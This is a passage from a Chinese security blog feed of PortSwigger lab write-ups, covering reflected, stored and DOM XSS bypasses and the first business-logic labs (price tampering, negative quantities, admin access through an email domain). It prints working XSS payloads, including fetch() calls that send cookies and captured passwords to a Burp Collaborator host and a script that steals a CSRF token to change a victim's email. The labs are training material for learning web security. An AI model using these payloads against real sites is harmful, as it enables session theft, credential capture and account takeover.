src="https://blog-imgs-1307281339.cos.ap-guangzhou.myqcloud.com/blog-imgs/202211212358541.png"></p><p>发现代码熟悉ng-app，名调用了AngularJS</p><p>AngularJS是一个流行的JavaScript库，它扫描包含属性的HTML节点的内容（也称为AngularJS指令）。将指令添加到 HTML 代码时，可以在双大括号内执行 JavaScript 表达式。在对尖括号进行编码时，此技术很有用。<code>ng-app</code></p><p>AngularJS造成xss参考文章<a href="https://www.mianshigee.com/note/detail/76633iai/">https://www.mianshigee.com/note/detail/76633iai/</a></p><p>使用payload</p><figure class="highlight handlebars"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs handlebars"><span class="hljs-template-variable">&#123;&#123;<span class="hljs-name">constructor.constructor</span>(<span class="hljs-name">&#x27;alert(1)&#x27;</span>)()&#125;&#125;</span><span class="language-xml"> </span><br></code></pre></td></tr></table></figure><p>完成实验</p><p>当引用了第三方js库就可能引起xss</p><hr><h3 id="12-反射式-DOM-XSS"><a href="#12-反射式-DOM-XSS" class="headerlink" title="12.反射式 DOM XSS"></a>12.反射式 DOM XSS</h3><p>进行进入博客搜索然后进行抓包</p><p><img src="https://blog-imgs-1307281339.cos.ap-guangzhou.myqcloud.com/blog-imgs/202211212358117.png"></p><p>在返回包中观察到会对</p><p>search-results进行检索</p><p><img src="https://blog-imgs-1307281339.cos.ap-guangzhou.myqcloud.com/blog-imgs/202211212358090.png"></p><p>构造payload闭合</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs js"><span class="hljs-number">1</span><span class="hljs-string">&quot;-alert(1)&#125;//</span><br></code></pre></td></tr></table></figure><p>但是观察到有一个反斜杠转义，因此多加一个反斜杠让他不转义</p><p><img src="https://blog-imgs-1307281339.cos.ap-guangzhou.myqcloud.com/blog-imgs/202211212358133.png"></p><p>舍友payload改为</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs js"><span class="hljs-number">1</span>\<span class="hljs-string">&quot;-alert(1)&#125;//</span><br></code></pre></td></tr></table></figure><p><img src="https://blog-imgs-1307281339.cos.ap-guangzhou.myqcloud.com/blog-imgs/202211212358014.png"></p><p>成功触发</p><h3 id="13-存储的-DOM-XSS"><a href="#13-存储的-DOM-XSS" class="headerlink" title="13.存储的 DOM XSS"></a>13.存储的 DOM XSS</h3><p>尝试插入</p><p><u>aa</p><p>在js中发现了过滤</p><p><img src="https://blog-imgs-1307281339.cos.ap-guangzhou.myqcloud.com/blog-imgs/202211212358046.png"></p><p>为了防止<a href="https://so.csdn.net/so/search?q=XSS&spm=1001.2101.3001.7020">XSS</a>，该网站使用 JavaScriptreplace()函数对尖括号进行编码。但是，当第一个参数是字符串时，该函数仅替换第一次出现。我们通过在注释的开头简单地包含一组额外的尖括号来利用此漏洞。这些尖括号将被编码，但任何后续尖括号将不受影响，使我们能够有效地绕过过滤器并注入 HTML。</p><p>所以构造payload</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs js">&lt;&gt;<span class="language-xml"><span class="hljs-tag">&lt;<span class="hljs-name">img</span> <span class="hljs-attr">src</span>=<span class="hljs-string">1</span> <span class="hljs-attr">onerror</span>=<span class="hljs-string">alert(1)</span>&gt;</span></span><br></code></pre></td></tr></table></figure><p><img src="https://blog-imgs-1307281339.cos.ap-guangzhou.myqcloud.com/blog-imgs/202211212358093.png"></p><p><img src="https://blog-imgs-1307281339.cos.ap-guangzhou.myqcloud.com/blog-imgs/202211212358470.png"></p><p>完成实验</p><h3 id="14-利用跨站点脚本窃取-cookie"><a href="#14-利用跨站点脚本窃取-cookie" class="headerlink" title="14.利用跨站点脚本窃取 cookie"></a>14.利用跨站点脚本窃取 cookie</h3><p>插入简单payload就造成弹窗</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-tag">&lt;<span class="hljs-name">script</span>&gt;</span>alert(1)<span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span><br></code></pre></td></tr></table></figure><p>那我们构造payload把cookie发送到Burp Collaborator Client</p><p>payload</p><figure class="highlight lisp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs lisp">fetch(&#x27;https<span class="hljs-symbol">://BURP-COLLABORATOR-SUBDOMAIN</span>&#x27;, &#123;<br>method: &#x27;POST&#x27;,<br>mode: &#x27;no-cors&#x27;,<br>body<span class="hljs-symbol">:document</span>.cookie<br>&#125;)<span class="hljs-comment">;</span><br></code></pre></td></tr></table></figure><p>Burp Collaborator Client使用</p><p>点击run测试是否正常</p><p><img src="https://blog-imgs-1307281339.cos.ap-guangzhou.myqcloud.com/blog-imgs/202211212358532.png"></p><p>点击burp 选择Collaborator Client打开</p><p><img src="https://blog-imgs-1307281339.cos.ap-guangzhou.myqcloud.com/blog-imgs/202211212358597.png"></p><p>然后点击复制</p><p><img src="https://blog-imgs-1307281339.cos.ap-guangzhou.myqcloud.com/blog-imgs/202211212358658.png"></p><p>把复制的内容填入</p><p>payload fetch</p><p>最终payload样式为</p><figure class="highlight lisp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs lisp">fetch(&#x27;https<span class="hljs-symbol">://dctl6v7eyxdtdzfvec95ysw980er6fv</span>.burpcollaborator.net&#x27;, &#123;<br>method: &#x27;POST&#x27;,<br>mode: &#x27;no-cors&#x27;,<br>body<span class="hljs-symbol">:document</span>.cookie<br>&#125;)<span class="hljs-comment">;</span><br></code></pre></td></tr></table></figure><p>然后到博客评论区提交payload 回到Collaborator Client点击poll now然后一会之后就可以看见交互</p><p>获取cookie之后替换即可，cookie为post里的传输值</p><p><img src="https://blog-imgs-1307281339.cos.ap-guangzhou.myqcloud.com/blog-imgs/202211212358886.png"></p><hr><h3 id="15-利用跨站点脚本捕获密码"><a href="#15-利用跨站点脚本捕获密码" class="headerlink" title="15.利用跨站点脚本捕获密码"></a>15.利用跨站点脚本捕获密码</h3><p>打开 burp collaborator client功能</p><p>点击复制返回替换payload里的值</p><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs http">&lt;input name=username id=username&gt;<br>&lt;input type=password name=password onchange=&quot;if(this.value.length)fetch(&#x27;https://BURP-COLLABORATOR-SUBDOMAIN&#x27;,&#123;<br>method:&#x27;POST&#x27;,<br><span class="hljs-attribute">mode</span><span class="hljs-punctuation">: </span>&#x27;no-cors&#x27;,<br>body:username.value+&#x27;:&#x27;+this.value<br>&#125;);&quot;&gt;<br></code></pre></td></tr></table></figure><p>然后payload放入评论区</p><p><img src="https://blog-imgs-1307281339.cos.ap-guangzhou.myqcloud.com/blog-imgs/202211212358805.png"></p><p>提交评论之后点击 poll now等一会就可以看见有交互了</p><p><img src="https://blog-imgs-1307281339.cos.ap-guangzhou.myqcloud.com/blog-imgs/202211212358125.png"></p><p>然后登录即可完成实验</p><hr><h3 id="16-利用XSS执行CSRF"><a href="#16-利用XSS执行CSRF" class="headerlink" title="16.利用XSS执行CSRF"></a>16.利用XSS执行CSRF</h3><p>这题需要使用xss执行csrf并且已经给出了payload</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs js">&lt;script&gt;<br><span class="hljs-keyword">var</span> req = <span class="hljs-keyword">new</span> <span class="hljs-title class_">XMLHttpRequest</span>();<br>req.<span class="hljs-property">onload</span> = handleResponse;<br>req.<span class="hljs-title function_">open</span>(<span class="hljs-string">&#x27;get&#x27;</span>,<span class="hljs-string">&#x27;/my-account&#x27;</span>,<span class="hljs-literal">true</span>);<br>req.<span class="hljs-title function_">send</span>();<br><span class="hljs-keyword">function</span> <span class="hljs-title function_">handleResponse</span>(<span class="hljs-params"></span>) &#123;<br>    <span class="hljs-keyword">var</span> token = <span class="hljs-variable language_">this</span>.<span class="hljs-property">responseText</span>.<span class="hljs-title function_">match</span>(<span class="hljs-regexp">/name=&quot;csrf&quot; value=&quot;(\w+)&quot;/</span>)[<span class="hljs-number">1</span>];<br>    <span class="hljs-keyword">var</span> changeReq = <span class="hljs-keyword">new</span> <span class="hljs-title class_">XMLHttpRequest</span>();<br>    changeReq.<span class="hljs-title function_">open</span>(<span class="hljs-string">&#x27;post&#x27;</span>, <span class="hljs-string">&#x27;/my-account/change-email&#x27;</span>, <span class="hljs-literal">true</span>);<br>    changeReq.<span class="hljs-title function_">send</span>(<span class="hljs-string">&#x27;csrf=&#x27;</span>+token+<span class="hljs-string">&#x27;&amp;email=test@test.com&#x27;</span>)<br>&#125;;<br>&lt;/script&gt;<br></code></pre></td></tr></table></figure><p>这个payload会发送一个请求 请求&#x2F;my-account页面 然后使用正则把返回包中的token值过滤出来</p><p>修改邮件的请求包如下可以看见需要验证csrf token</p><p><img src="https://blog-imgs-1307281339.cos.ap-guangzhou.myqcloud.com/blog-imgs/202211212358220.png"></p><p>但是当我们访问&#x2F;my-account页面时</p><img src="https://blog-imgs-1307281339.cos.ap-guangzhou.myqcloud.com/blog-imgs/202211212354886.png" style="zoom:80%;" /><p>返回包会泄露用户token</p><p>那payload在获取token之后直接请求修改邮箱就可以造成csrf</p><hr><h3 id="17-将-XSS-反射到-HTML-上下文中，阻止大多数标记和属性"><a href="#17-将-XSS-反射到-HTML-上下文中，阻止大多数标记和属性" class="headerlink" title="17.将 XSS 反射到 HTML 上下文中，阻止大多数标记和属性"></a>17.将 XSS 反射到 HTML 上下文中，阻止大多数标记和属性</h3><p>本关注入点在搜索框是个反射性xss</p><p><img src="https://blog-imgs-1307281339.cos.ap-guangzhou.myqcloud.com/blog-imgs/202303091538156.png"></p><p><img src="https://blog-imgs-1307281339.cos.ap-guangzhou.myqcloud.com/blog-imgs/202303091537088.png"></p><p>发现有标签被过滤了接下来用字典fuzz一下看看有什么没被过滤</p><p>字典地址<a href="https://portswigger.net/web-security/cross-site-scripting/cheat-sheet">https://portswigger.net/web-security/cross-site-scripting/cheat-sheet</a></p><p>fuzz所有标签和事件</p><p><img src="https://blog-imgs-1307281339.cos.ap-guangzhou.myqcloud.com/blog-imgs/202303091559138.png"></p><p><img src="https://blog-imgs-1307281339.cos.ap-guangzhou.myqcloud.com/blog-imgs/202303091543774.png"></p><p><img src="https://blog-imgs-1307281339.cos.ap-guangzhou.myqcloud.com/blog-imgs/202303091602887.png"></p><p>发现body标签没过滤 还有很多事件没过滤</p><p>现在使用body标签和onresize事件都是不经过过滤的</p><p>使用payload</p><figure class="highlight perl"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs perl">&lt;iframe src=<span class="hljs-string">&quot;https://YOUR-LAB-ID.web-security-academy.net/?search=%22%3E%3Cbody%20onresize=print()%3E&quot;</span> onload=this.style.width=<span class="hljs-string">&#x27;100px&#x27;</span>&gt;<br></code></pre></td></tr></table></figure><p>填入靶场链接点击 store和deliver exploit to victim完成实验</p><p><img src="https://blog-imgs-1307281339.cos.ap-guangzhou.myqcloud.com/blog-imgs/202303091613724.png"></p><h3 id="18-将-XSS-反射到-HTML-上下文中，阻止除自定义标记之外的所有标记"><a href="#18-将-XSS-反射到-HTML-上下文中，阻止除自定义标记之外的所有标记" class="headerlink" title="18.将 XSS 反射到 HTML 上下文中，阻止除自定义标记之外的所有标记"></a>18.将 XSS 反射到 HTML 上下文中，阻止除自定义标记之外的所有标记</h3><p>题目有点哈人</p><p>阻止除自定义标记之外的所有 HTML 标记。</p><p>要解决实验室问题，请执行跨站点脚本攻击，注入自定义标记并自动发出警报document.cookie。</p><p>payload</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-section">&lt;script&gt;</span><br><span class="hljs-attribute">location</span> = &#x27;https://YOUR-LAB-ID.web-security-academy.net/?search=%<span class="hljs-number">3</span>Cxss+id%<span class="hljs-number">3</span>Dx+onfocus%<span class="hljs-number">3</span>Dalert%<span class="hljs-number">28</span>document.cookie%<span class="hljs-number">29</span>%<span class="hljs-number">20</span>tabindex=<span class="hljs-number">1</span>%<span class="hljs-number">3</span>E#x&#x27;;<br><span class="hljs-section">&lt;/script&gt;</span><br></code></pre></td></tr></table></figure><p>在实验室使用即可</p><h3 id="19-允许使用一些-SVG-标记的反射式-XSS"><a href="#19-允许使用一些-SVG-标记的反射式-XSS" class="headerlink" title="19.允许使用一些 SVG 标记的反射式 XSS"></a>19.允许使用一些 SVG 标记的反射式 XSS</h3><p>svg是一个HTML标签根据题目说明了没过滤可以直接用</p><p>漏洞点还是在搜索框 先fuzz一下什么事件没过滤</p><p><img src="https://blog-imgs-1307281339.cos.ap-guangzhou.myqcloud.com/blog-imgs/202303091628932.png"></p><p>发现<svg><animatetransform><title><image></p><p>这些标签都没被过滤</p><p>需要构造语句还需要fuzz一下看什么事件没过滤</p><p><img src="https://blog-imgs-1307281339.cos.ap-guangzhou.myqcloud.com/blog-imgs/202303122313666.png"></p><p>发现onbegin事件还能用</p><p><img src="https://blog-imgs-1307281339.cos.ap-guangzhou.myqcloud.com/blog-imgs/202303122319581.png"></p><p>构造payload</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs xml">?search=&quot;&gt;<span class="hljs-tag">&lt;<span class="hljs-name">svg</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">animatetransform</span> <span class="hljs-attr">onbegin</span>=<span class="hljs-string">alert(1)</span>&gt;</span><br></code></pre></td></tr></table></figure><p>输入即可完成</p><h3 id="20-规范链接标记中的反射-XSS"><a href="#20-规范链接标记中的反射-XSS" class="headerlink" title="20.规范链接标记中的反射 XSS"></a>20.规范链接标记中的反射 XSS</h3><p>只能在谷歌浏览器使用</p><p>payload</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">https</span>://YOUR-LAB-ID.web-security-academy.net/?%<span class="hljs-number">27</span>accesskey=%<span class="hljs-number">27</span>x%<span class="hljs-number">27</span>onclick=%<span class="hljs-number">27</span>alert(<span class="hljs-number">1</span>)<br></code></pre></td></tr></table></figure><h3 id="21-将XSS反射到带有单引号和反斜杠转义的JavaScript字符串中"><a href="#21-将XSS反射到带有单引号和反斜杠转义的JavaScript字符串中" class="headerlink" title="21.将XSS反射到带有单引号和反斜杠转义的JavaScript字符串中"></a>21.将XSS反射到带有单引号和反斜杠转义的JavaScript字符串中</h3><p>在搜索框输入111并且抓包</p><p><img src="https://blog-imgs-1307281339.cos.ap-guangzhou.myqcloud.com/blog-imgs/202303141536819.png"></p><p>发现明显漏洞点</p><p>构造payload</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs xml">&#x27;;<span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">script</span>&gt;</span>alert(1)<span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span><br></code></pre></td></tr></table></figure><p><img src="https://blog-imgs-1307281339.cos.ap-guangzhou.myqcloud.com/blog-imgs/202303141538213.png"></p><p>成功</p><h3 id="22-将XSS反射到带有尖括号和双引号的JavaScript字符串中，HTML编码和单引号转义"><a href="#22-将XSS反射到带有尖括号和双引号的JavaScript字符串中，HTML编码和单引号转义" class="headerlink" title="22.将XSS反射到带有尖括号和双引号的JavaScript字符串中，HTML编码和单引号转义"></a>22.将XSS反射到带有尖括号和双引号的JavaScript字符串中，HTML编码和单引号转义</h3><p>搜索框是和上一题一样的漏洞点</p><p><img src="https://blog-imgs-1307281339.cos.ap-guangzhou.myqcloud.com/blog-imgs/202303141550234.png"></p><p>但是使用上一条的payload发现有过滤 尖括号被转义</p><p><img src="https://blog-imgs-1307281339.cos.ap-guangzhou.myqcloud.com/blog-imgs/202303141551232.png"></p><p>payload</p><figure class="highlight cos"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs cos">\&#x27;-alert(<span class="hljs-number">1</span>)<span class="hljs-comment">//</span><br></code></pre></td></tr></table></figure><p>payload思路</p><p><img src="https://blog-imgs-1307281339.cos.ap-guangzhou.myqcloud.com/blog-imgs/202303141554236.png"></p><p>因为可控内容在标签script标签里 因此直接不考虑尖括号过滤构造闭合即可</p><h3 id="23-将-XSS-存储到带有尖括号和双引号的事件中-HTML-编码，单引号和反斜杠转义"><a href="#23-将-XSS-存储到带有尖括号和双引号的事件中-HTML-编码，单引号和反斜杠转义" class="headerlink" title="23.将 XSS 存储到带有尖括号和双引号的事件中 HTML 编码，单引号和反斜杠转义"></a>23.将 XSS 存储到带有尖括号和双引号的事件中 HTML 编码，单引号和反斜杠转义</h3><p>在博客评论区进行评论</p><p><img src="https://blog-imgs-1307281339.cos.ap-guangzhou.myqcloud.com/blog-imgs/202303141608695.png"></p><p>发现了漏洞点</p><p><img src="https://blog-imgs-1307281339.cos.ap-guangzhou.myqcloud.com/blog-imgs/202303141609943.png"></p><p>payload</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs xml">http://foo?<span class="hljs-symbol">&amp;apos;</span>-alert(1)-<span class="hljs-symbol">&amp;apos;</span><br></code></pre></td></tr></table></figure><p><img src="https://blog-imgs-1307281339.cos.ap-guangzhou.myqcloud.com/blog-imgs/202303141614524.png"></p><h3 id="24-将-XSS-反射到带有尖括号、单引号、双引号、反斜杠和反引号的模板文本中-Unicode-转义"><a href="#24-将-XSS-反射到带有尖括号、单引号、双引号、反斜杠和反引号的模板文本中-Unicode-转义" class="headerlink" title="24.将 XSS 反射到带有尖括号、单引号、双引号、反斜杠和反引号的模板文本中 Unicode 转义"></a>24.将 XSS 反射到带有尖括号、单引号、双引号、反斜杠和反引号的模板文本中 Unicode 转义</h3><p><img src="https://blog-imgs-1307281339.cos.ap-guangzhou.myqcloud.com/blog-imgs/202303141622321.png"></p><p><img src="https://blog-imgs-1307281339.cos.ap-guangzhou.myqcloud.com/blog-imgs/202303141624407.png"></p><p>发现payload被转义</p><p>使用新payload</p><figure class="highlight scss"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs scss">$&#123;<span class="hljs-built_in">alert</span>(<span class="hljs-number">1</span>)&#125;<br></code></pre></td></tr></table></figure><p><img src="https://blog-imgs-1307281339.cos.ap-guangzhou.myqcloud.com/blog-imgs/202303141626026.png"></p><h3 id="25-阻止事件处理程序和属性的反射式-XSS"><a href="#25-阻止事件处理程序和属性的反射式-XSS" class="headerlink" title="25.阻止事件处理程序和属性的反射式 XSS"></a>25.阻止事件处理程序和属性的反射式 XSS</h3><p>payload</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">https</span>://YOUR-LAB-ID.web-security-academy.net/?search=%<span class="hljs-number">3</span>Csvg%<span class="hljs-number">3</span>E%<span class="hljs-number">3</span>Ca%<span class="hljs-number">3</span>E%<span class="hljs-number">3</span>Canimate+attributeName%<span class="hljs-number">3</span>Dhref+values%<span class="hljs-number">3</span>Djavascript%<span class="hljs-number">3</span>Aalert(<span class="hljs-number">1</span>)+%<span class="hljs-number">2</span>F%<span class="hljs-number">3</span>E%<span class="hljs-number">3</span>Ctext+x%<span class="hljs-number">3</span>D20+y%<span class="hljs-number">3</span>D20%<span class="hljs-number">3</span>EClick%<span class="hljs-number">20</span>me%<span class="hljs-number">3</span>C%<span class="hljs-number">2</span>Ftext%<span class="hljs-number">3</span>E%<span class="hljs-number">3</span>C%<span class="hljs-number">2</span>Fa%<span class="hljs-number">3</span>E<br></code></pre></td></tr></table></figure><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs xml">https://YOUR-LAB-ID.web-security-academy.net/?search=<span class="hljs-tag">&lt;<span class="hljs-name">svg</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">a</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">animate</span> <span class="hljs-attr">attributeName</span>=<span class="hljs-string">href</span> <span class="hljs-attr">values</span>=<span class="hljs-string">javascript:alert(1)</span> /&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">text</span> <span class="hljs-attr">x</span>=<span class="hljs-string">20</span> <span class="hljs-attr">y</span>=<span class="hljs-string">20</span>&gt;</span>Click me<span class="hljs-tag">&lt;/<span class="hljs-name">text</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">a</span>&gt;</span><br><br></code></pre></td></tr></table></figure><p>这里复制payload的后半部分进行搜索不会触发弹窗</p><p><img src="https://blog-imgs-1307281339.cos.ap-guangzhou.myqcloud.com/blog-imgs/202303141637796.png"></p><p>直接访问带payload的url才能触发</p><img src="https://blog-imgs-1307281339.cos.ap-guangzhou.myqcloud.com/blog-imgs/202303141638797.png"  style="zoom:50%;" /><h3 id="26-在-JavaScript-URL-中反射-XSS，但阻止了一些字符"><a href="#26-在-JavaScript-URL-中反射-XSS，但阻止了一些字符" class="headerlink" title="26.在 JavaScript URL 中反射 XSS，但阻止了一些字符"></a>26.在 JavaScript URL 中反射 XSS，但阻止了一些字符</h3><p>发现漏洞点</p><p><img src="https://blog-imgs-1307281339.cos.ap-guangzhou.myqcloud.com/blog-imgs/202303141647036.png"></p><p>payload</p><figure class="highlight llvm"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs llvm"><span class="hljs-symbol">https:</span>//YOUR-LAB-ID.web-security-academy.net/post?postId<span class="hljs-operator">=</span><span class="hljs-number">5</span>&amp;<span class="hljs-variable">%27</span>&#125;<span class="hljs-punctuation">,</span><span class="hljs-keyword">x</span><span class="hljs-operator">=</span><span class="hljs-keyword">x</span><span class="hljs-operator">=</span><span class="hljs-variable">%3</span>E&#123;throw/**/onerror<span class="hljs-operator">=</span>alert<span class="hljs-punctuation">,</span><span class="hljs-number">1337</span>&#125;<span class="hljs-punctuation">,</span>toString<span class="hljs-operator">=</span><span class="hljs-keyword">x</span><span class="hljs-punctuation">,</span>window<span class="hljs-variable">%2</span>b<span class="hljs-variable">%27</span><span class="hljs-variable">%27</span><span class="hljs-punctuation">,</span>&#123;<span class="hljs-keyword">x</span>:<span class="hljs-variable">%27</span><br></code></pre></td></tr></table></figure><p><img src="https://blog-imgs-1307281339.cos.ap-guangzhou.myqcloud.com/blog-imgs/202303141650251.png"></p><h3 id="27-反射式XSS与AngularJS沙盒转义没有字符串"><a href="#27-反射式XSS与AngularJS沙盒转义没有字符串" class="headerlink" title="27.反射式XSS与AngularJS沙盒转义没有字符串"></a>27.反射式XSS与AngularJS沙盒转义没有字符串</h3>]]></content>
    
    
    <categories>
      
      <category>网络安全</category>
      
    </categories>
    
    
    <tags>
      
      <tag>burpsuite靶场</tag>
      
      <tag>xss</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>burpsuite靶场逻辑漏洞</title>
    <link href="/2022/11/10/burpsuite%E9%9D%B6%E5%9C%BA%E9%80%BB%E8%BE%91%E6%BC%8F%E6%B4%9E/"/>
    <url>/2022/11/10/burpsuite%E9%9D%B6%E5%9C%BA%E9%80%BB%E8%BE%91%E6%BC%8F%E6%B4%9E/</url>
    
    <content type="html"><![CDATA[<p><img src="https://blog-imgs-1307281339.cos.ap-guangzhou.myqcloud.com/blog-imgs/202211102158492.png"></p><p>靶场地址 <a href="https://portswigger.net/web-security/all-labs">All labs | Web Security Academy (portswigger.net)</a></p><p>说明：靶场的每一题都不会漏，关卡名字都是浏览器直译。可以不看名字直接数第几关，都是按顺序写的</p><hr><h3 id="1-对客户端控件的过度信任"><a href="#1-对客户端控件的过度信任" class="headerlink" title="1.对客户端控件的过度信任"></a>1.对客户端控件的过度信任</h3><p>描述：此实验室未充分验证用户输入。您可以利用其采购工作流程中的逻辑缺陷以意外价格购买商品。要解决实验室问题，请购买“轻巧的l33t皮夹克”。</p><p>您可以使用以下凭据登录自己的帐户：<code>wiener:peter</code></p><p>思考：根据描述应该是修改价格的支付漏洞</p><p>一般修改价格的支付漏洞有几个点</p><p>1.商品添加到购物车时</p><p>2.生成订单时</p><p>3.由订单生成付款时</p><p>解决;</p><p>登录（账号）wiener  （密码）peter 之后</p><p>进入要求修改价格的夹克衫</p><p>点击添加到购物车时抓包</p><p><img src="https://blog-imgs-1307281339.cos.ap-guangzhou.myqcloud.com/blog-imgs/202211102053105.png"></p><p><img src="https://blog-imgs-1307281339.cos.ap-guangzhou.myqcloud.com/blog-imgs/202211102053678.png"></p><p>发现带有价格的数据包</p><p>修改价格为1之后放包</p><p>进入购物车即可成功下单</p><hr><h3 id="2-高级逻辑漏洞"><a href="#2-高级逻辑漏洞" class="headerlink" title="2.高级逻辑漏洞"></a>2.高级逻辑漏洞</h3><p>描述：此实验室未充分验证用户输入。您可以利用其采购工作流程中的逻辑缺陷以意外价格购买商品。要解决实验室问题，请购买“轻巧的l33t皮夹克”。</p><p>您可以使用以下凭据登录自己的帐户：<code>wiener:peter</code></p><p>依然是支付漏洞</p><p><img src="https://blog-imgs-1307281339.cos.ap-guangzhou.myqcloud.com/blog-imgs/202211102053940.png"></p><p>但是在添加到购物车里的时候已经没有价格参数</p><p>那就从数量参数上入手</p><p>尝试添加 0.1 等数量的产品 但是页面出现报错</p><p>那么就添加负数 发现成功添加</p><p><img src="https://blog-imgs-1307281339.cos.ap-guangzhou.myqcloud.com/blog-imgs/202211102053275.png"></p><p>点击结账发现提示说 付款总价不能低于0</p><p>因此添加其他商品将金额大于0 即可</p><p><img src="https://blog-imgs-1307281339.cos.ap-guangzhou.myqcloud.com/blog-imgs/202211102053881.png"></p><p>成功购买之后发现漏洞还未解决</p><p>反过来添加正常价格的夹克衫，添加其他商品的负数即可</p><p><img src="https://blog-imgs-1307281339.cos.ap-guangzhou.myqcloud.com/blog-imgs/202211102054741.png"></p><hr><h3 id="3-安全控制不一致"><a href="#3-安全控制不一致" class="headerlink" title="3.安全控制不一致"></a>3.安全控制不一致</h3><p>描述：</p><p>此实验室有缺陷的逻辑允许任意用户访问应仅对公司员工可用的管理功能。要解决实验室问题，请访问管理面板并删除 Carlos。</p><p>首先要找到管理面板</p><p>本打算扫描一下后台，蒙了一个&#x2F;admin 发现对了</p><p><img src="https://blog-imgs-1307281339.cos.ap-guangzhou.myqcloud.com/blog-imgs/202211102054873.png"></p><p>发现需要用户DontWannaCry才可以访问管理面板</p><p>进入到注册页面</p><p><img src="https://blog-imgs-1307281339.cos.ap-guangzhou.myqcloud.com/blog-imgs/202211102135933.png"></p><p>根据提示我们使用<a href="mailto:&#97;&#x6e;&#x79;&#x74;&#104;&#105;&#x6e;&#x67;&#64;&#121;&#111;&#117;&#114;&#45;&#101;&#109;&#x61;&#x69;&#108;&#45;&#105;&#100;&#x2e;&#x77;&#101;&#x62;&#45;&#115;&#x65;&#x63;&#117;&#x72;&#105;&#116;&#121;&#45;&#x61;&#99;&#97;&#100;&#101;&#x6d;&#x79;&#x2e;&#x6e;&#101;&#116;">&#97;&#x6e;&#x79;&#x74;&#104;&#105;&#x6e;&#x67;&#64;&#121;&#111;&#117;&#114;&#45;&#101;&#109;&#x61;&#x69;&#108;&#45;&#105;&#100;&#x2e;&#x77;&#101;&#x62;&#45;&#115;&#x65;&#x63;&#117;&#x72;&#105;&#116;&#121;&#45;&#x61;&#99;&#97;&#100;&#101;&#x6d;&#x79;&#x2e;&#x6e;&#101;&#116;</a>格式的邮箱进行注册</p><p>点击 email client</p><p><img src="https://blog-imgs-1307281339.cos.ap-guangzhou.myqcloud.com/blog-imgs/202211102140800.png"></p><p>根据他提供的邮箱进行注册</p><p><img src="https://blog-imgs-1307281339.cos.ap-guangzhou.myqcloud.com/blog-imgs/202211102140794.png"></p><p>尝试进行注册</p><p>成功注册并且登录</p><p><img src="https://blog-imgs-1307281339.cos.ap-guangzhou.myqcloud.com/blog-imgs/202211102147548.png"></p><p>然后将你的邮箱改为 <a href="mailto:&#x78;&#x78;&#x78;&#64;&#x64;&#111;&#110;&#x74;&#119;&#97;&#110;&#x6e;&#x61;&#x63;&#x72;&#121;&#46;&#x63;&#111;&#109;">&#x78;&#x78;&#x78;&#64;&#x64;&#111;&#110;&#x74;&#119;&#97;&#110;&#x6e;&#x61;&#x63;&#x72;&#121;&#46;&#x63;&#111;&#109;</a></p><p>即可访问admin页面</p><p><img src="https://blog-imgs-1307281339.cos.ap-guangzhou.myqcloud.com/blog-imgs/202211102148126.png"></p><p>删除carlos完成靶场</p><p>根据说明，这一关的网站是该公司的内部账号及 <a 